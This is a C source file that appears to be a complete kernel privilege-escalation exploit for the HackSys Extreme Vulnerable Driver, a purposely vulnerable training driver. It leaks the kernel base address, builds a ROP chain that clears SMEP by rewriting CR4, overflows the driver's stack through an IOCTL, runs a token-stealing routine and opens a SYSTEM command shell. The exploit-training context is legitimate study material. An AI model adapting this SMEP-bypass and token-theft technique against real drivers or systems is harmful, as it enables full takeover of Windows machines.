#include <Windows.h>
#include <stdio.h>
#include <Psapi.h>

EXTERN_C VOID GetSystemToken();

#define ARRAY_SIZE 1024
#define GADGET_COUNT 2

#define BUFFER_SIZE 2088

#define HACKSYS_EVD_IOCTL_STACK_OVERFLOW  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_NEITHER, FILE_ANY_ACCESS)

LPVOID GetNtAddress()
{
	LPVOID drivers[ARRAY_SIZE];
	DWORD cbNeeded;

	if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded < sizeof(drivers))
	{
		TCHAR lpBaseName[ARRAY_SIZE];

		if (GetDeviceDriverBaseName(drivers[0], lpBaseName, sizeof(lpBaseName)))
		{
			printf("[+] Address of %s is 0x%p\n", lpBaseName, drivers[0]);

			return drivers[0];
		}
		else
		{
			printf("[-] GetDeviceBaseName failed, the error code is 0x%X\n", GetLastError());

			return NULL;
		}
	}
	else
	{
		printf("[-] EnumDeviceDriver failed, array size needed is %d\n", (int)(cbNeeded / sizeof(LPVOID)));
		
		return NULL;
	}
}

int wmain(int argc, wchar_t* argv[])
{
	LPVOID ntoskrnlAddr;
	LPVOID gadgetsAddr[GADGET_COUNT] = {0};
	LPVOID userBuffer = NULL;
	SIZE_T userBufferSize = BUFFER_SIZE;

	ntoskrnlAddr = GetNtAddress();

	if (ntoskrnlAddr == NULL)
	{
		return -1;
	}

	/*
	 * The first gadget:
	 *   59				pop     rcx
	 *   c3				ret
	 */
	gadgetsAddr[0] = (LPVOID)((INT_PTR)ntoskrnlAddr + 0xfbec);

	/*
	 * The second gadget:
	 *	 0f22e1          mov     cr4,rcx
	 *	 c3              ret
	 */
	gadgetsAddr[1] = (LPVOID)((INT_PTR)ntoskrnlAddr + 0x168df7);

	printf("[+] The address of the first gadget is 0x%p\n", gadgetsAddr[0]);
	printf("[+] The address of the second gadget is 0x%p\n", gadgetsAddr[1]);

	HANDLE device = CreateFile(
		"\\\\.\\HackSysExtremeVulnerableDriver",
		GENERIC_READ | GENERIC_WRITE,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
		NULL);

	if (device == INVALID_HANDLE_VALUE)
	{
		printf("[-] Failed to open handle to device, the error code is 0x%X\n", GetLastError());

		return -1;
	}

	printf("[+] The handle to device is 0x%p\n", device);

	userBuffer = (LPVOID)HeapAlloc(
		GetProcessHeap(),
		HEAP_ZERO_MEMORY,
		userBufferSize);

	/*userBuffer = VirtualAlloc(
		NULL,
		userBufferSize,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);*/

	if (userBuffer == NULL)
	{
		printf("[-] Failed to allocate memory, the error code is 0x%X\n", GetLastError());

		return -1;
	}

	printf("[+] The address of the userBuffer is 0x%p\n", userBuffer);
	printf("[+] The size of the userBuffer is 0x%llX\n", userBufferSize);

	RtlFillMemory(userBuffer, userBufferSize, 0x41);

	INT_PTR ropAddr = ((INT_PTR)userBuffer + BUFFER_SIZE - 0x20);
	INT_PTR shellcodeAddr = ((INT_PTR)userBuffer + BUFFER_SIZE - 0x8);

	printf("[+] The address of the ropAddr is 0x%p\n", (LPVOID)(ropAddr));
	printf("[+] The address of the shellcodeAddr is 0x%p\n", (LPVOID)(shellcodeAddr));

	*(INT_PTR *)ropAddr = (INT_PTR)gadgetsAddr[0];
	*(INT_PTR *)(ropAddr + 0x8) = (INT_PTR)0x70678;
	*(INT_PTR *)(ropAddr + 0x10) = (INT_PTR)gadgetsAddr[1];

	*(INT_PTR *)shellcodeAddr = (INT_PTR)&GetSystemToken;

	DWORD bytesReturned;

	if (DeviceIoControl(
		device,
		HACKSYS_EVD_IOCTL_STACK_OVERFLOW,
		userBuffer,
		userBufferSize,
		NULL,
		0,
		&bytesReturned,
		NULL))
	{
		printf("[+] Done!\n\n");
		system("cmd.exe");
	}
	else
	{
		printf("[-] DeviceIoControl failed, the error code is %d\n", GetLastError());
		
		return -1;
	}



	return 0;
}